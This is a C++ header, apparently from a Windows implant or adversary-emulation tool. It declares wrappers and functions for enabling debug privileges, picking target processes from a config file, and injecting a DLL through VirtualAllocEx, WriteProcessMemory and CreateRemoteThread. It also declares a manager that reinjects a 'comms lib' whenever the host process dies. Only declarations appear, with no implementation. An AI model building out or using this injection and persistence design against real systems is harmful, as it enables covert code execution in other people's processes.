#ifndef INJECTION_H_
#define INJECTION_H_

#include <windows.h>
#include <tlhelp32.h>
#include <filesystem>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <sstream>
#include <algorithm>
#include <cctype>
#include <locale>
#include "../include/orchestrator.h"

namespace injection {

extern const char* kInjectDllName; // Name of the Dll to inject
extern const char* kModuleKernel32; // Hold the name of the kernel32 module
extern const char* kSpawnedImageName; // The name of the exe we're trying to spawn, used for testing

class InjectionCallWrapperInterface {
public:
    InjectionCallWrapperInterface(){}
    virtual ~InjectionCallWrapperInterface(){}

    // Wrapper for OpenProcessToken
    virtual WINBOOL OpenProcessTokenWrapper(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle) = 0;

    // Wrapper for GetCurrentProcess
    virtual HANDLE GetCurrentProcessWrapper() = 0;

    // Wrapper for LookupPrivilegeValue
    virtual BOOL LookupPrivilegeValueWrapper(LPCTSTR lpSystemName, LPCTSTR lpName, PLUID lpLuid) = 0;

    // Wrapper for AdjustTokenPrivileges
    virtual WINBOOL AdjustTokenPrivilegesWrapper(HANDLE TokenHandle, WINBOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength) = 0;

    // Wrapper for CloseHandle
    virtual WINBOOL CloseHandleWrapper(HANDLE hObject) = 0;

    // Wrapper for CreateToolhelp32Snapshot
    virtual HANDLE CreateToolhelp32SnapshotWrapper(DWORD dwFlags, DWORD th32ProcessID) = 0;

    // Wrapper for Process32First
    virtual WINBOOL Process32FirstWrapper(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) = 0;

    // Wrapper for Process32Next
    virtual WINBOOL Process32NextWrapper(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) = 0;
    
    // Wrapper for OpenProcess
    virtual HANDLE OpenProcessWrapper(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessID) = 0;

    // Wrapper for GetLastError
    virtual DWORD GetLastErrorWrapper() = 0;

    // Wrapper for Module32First
    virtual WINBOOL Module32FirstWrapper(HANDLE hSnapshot, LPMODULEENTRY32 lpme) = 0;

    // Wrapper for Module32Next
    virtual WINBOOL Module32NextWrapper(HANDLE hSnapshot, LPMODULEENTRY32 lpme) = 0;

    // Wrapper for GetProcAddress
    virtual FARPROC GetProcAddressWrapper(HMODULE hModule, LPCSTR lpProcName) = 0;
    
    // Wrapper for VirtualAllocEx
    virtual LPVOID VirtualAllocExWrapper(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = 0;

    // Wrapper for WriteProcessMemory
    virtual WINBOOL WriteProcessMemoryWrapper(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) = 0;

    // Wrapper for CreateRemoteThread
    virtual HANDLE CreateRemoteThreadWrapper(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFLags, LPDWORD lpThreadId) = 0;

    // Get the szExeFile of a pe object
    virtual std::string GetPEszExeFile(PROCESSENTRY32 *pe) = 0;

    // Get the th32ProcessID of a pe object
    virtual DWORD GetPEth32ProcessID(PROCESSENTRY32 *pe) = 0;

    // Get the th32ParentProcessID of a pe object
    virtual DWORD GetPEth32ParentProcessID(PROCESSENTRY32 *pe)  = 0;

    // Get the szModule of a me object
    virtual std::string GetMEszModule(MODULEENTRY32 *me) = 0;
    
    // Get the hModule of a me object
    virtual HMODULE GetMEhModule(MODULEENTRY32 *me) = 0;
};

class InjectionCallWrapper : public InjectionCallWrapperInterface {
public:
    WINBOOL OpenProcessTokenWrapper(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
    HANDLE GetCurrentProcessWrapper();
    BOOL LookupPrivilegeValueWrapper(LPCTSTR lpSystemName, LPCTSTR lpName, PLUID lpLuid);
    WINBOOL AdjustTokenPrivilegesWrapper(HANDLE TokenHandle, WINBOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
    WINBOOL CloseHandleWrapper(HANDLE hObject);
    HANDLE CreateToolhelp32SnapshotWrapper(DWORD dwFlags, DWORD th32ProcessID);
    WINBOOL Process32FirstWrapper(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
    WINBOOL Process32NextWrapper(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
    HANDLE OpenProcessWrapper(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessID);
    DWORD GetLastErrorWrapper();
    WINBOOL Module32FirstWrapper(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
    WINBOOL Module32NextWrapper(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
    FARPROC GetProcAddressWrapper(HMODULE hModule, LPCSTR lpProcName);
    LPVOID VirtualAllocExWrapper(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    WINBOOL WriteProcessMemoryWrapper(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
    HANDLE CreateRemoteThreadWrapper(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFLags, LPDWORD lpThreadId);
    std::string GetPEszExeFile(PROCESSENTRY32 *pe);
    DWORD GetPEth32ProcessID(PROCESSENTRY32 *pe);
    DWORD GetPEth32ParentProcessID(PROCESSENTRY32 *pe);
    std::string GetMEszModule(MODULEENTRY32 *me);
    HMODULE GetMEhModule(MODULEENTRY32 *me);
};

// Enable debug privs for the current process
// Returns EXIT_SUCCESS on success, otherwise some type of FAIL
int EnableDebugPrivs(InjectionCallWrapperInterface* i_call_wrapper);

// Helper function to read the config file and get a string vector of target processes
// Returns EXIT_SUCCESS on success, otherwise some type of FAIL
int GetTargetProcessesVector(InjectionCallWrapperInterface* i_call_wrapper, std::vector<std::string> *targetProcesses);

// Given a name of a process, return a handle to all instances of it, its PID, and its parent's PID
// Returns EXIT_SUCCESS on success, otherwise some type of FAIL
int GetProcessVectorsHandlePIDsPPIDs(InjectionCallWrapperInterface* i_call_wrapper, std::string targetProcessName, std::vector<HANDLE> *vhTargetProcesses, std::vector<DWORD> *vTargetPIDs, std::vector<DWORD> *vTargetParentPIDs);

// Given a name of a module and a process' PID, return a handle to that module
// Returns EXIT_SUCCESS on success, otherwise some type of FAIL
int GetModuleHandleByName(InjectionCallWrapperInterface* i_call_wrapper, std::string Module, HMODULE *hModule, DWORD PID);

// Actually perform the injection
// Returns EXIT_SUCCESS on success, otherwise some type of FAIL
int PerformInjection(InjectionCallWrapperInterface* i_call_wrapper, std::string Process, LPCSTR loadLibrary, DWORD PID, HMODULE *hKERNEL32);

// "main" function, stage everything for the injection, call PerformInjection, validate injection
// No returns, will log any errors it encounters
int InjectionMain(InjectionCallWrapperInterface* i_call_wrapper);

// responsible for making sure the comms lib is injected and the if the host process
// dies, reinjecting it
void InjectionManager(InjectionCallWrapperInterface* i_call_wrapper);

} // namespace injection

#endif